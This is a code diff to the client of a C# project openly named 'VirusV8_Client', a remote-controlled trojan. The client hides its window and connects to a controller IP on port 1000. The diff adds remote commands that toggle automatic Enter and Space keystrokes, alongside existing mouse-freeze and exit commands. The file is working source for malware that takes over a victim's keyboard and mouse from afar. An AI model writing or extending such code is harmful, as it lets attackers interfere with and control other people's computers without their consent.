@@ -19,19 +19,22 @@ namespace VirusV8_Client
     public partial class Form1 : Form
     {
         MouseFreeze mouseFreeze;
-        
+        AutoEnter autoenter;
+        AutoSpace autospace;
+        String ip = "localhost";
+       
         public Form1()
         {
             InitializeComponent();
-            Cursor.Hide();
-
+            autoenter = new AutoEnter();
+            autospace = new AutoSpace();
         }
         Socket s;
         private void timerTryConnect_Tick(object sender, EventArgs e)
         {
             try
             {
-                Client client = new Client("localhost", 1000);//IP CHANGE
+                Client client = new Client(ip, 1000);//IP CHANGE
                 s = client.socket;
                 timerTryConnect.Enabled = false;
                 timerTryReceive.Enabled = true;
@@ -129,8 +132,18 @@ namespace VirusV8_Client
                         case "ExitVirus":
                             new ExitVirus();
                             break;
-
-
+                        case "AutoEnterEnable":
+                            autoenter.Enable();
+                            break;
+                        case "AutoEnterDisable":
+                            autoenter.Disable();
+                            break;
+                        case "AutoSpaceEnable":
+                            autospace.Enable();
+                            break;
+                        case "AutoSpaceDisable":
+                            autospace.Disable();
+                            break;
                     }
 
 
@@ -177,6 +190,29 @@ namespace VirusV8_Client
         {
             public static string PopUpMessageText;
             public static int Anzeigezeit;
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                ip = textBox1.Text;
+                timerTryConnect.Enabled = true;
+                this.Opacity = 0;
+            }
+            catch (Exception exe)
+            {
+                ip = "localhost";
+                timerTryConnect.Enabled = true;
+                this.Opacity = 0;
+            }
+
+
         }
     }
 }
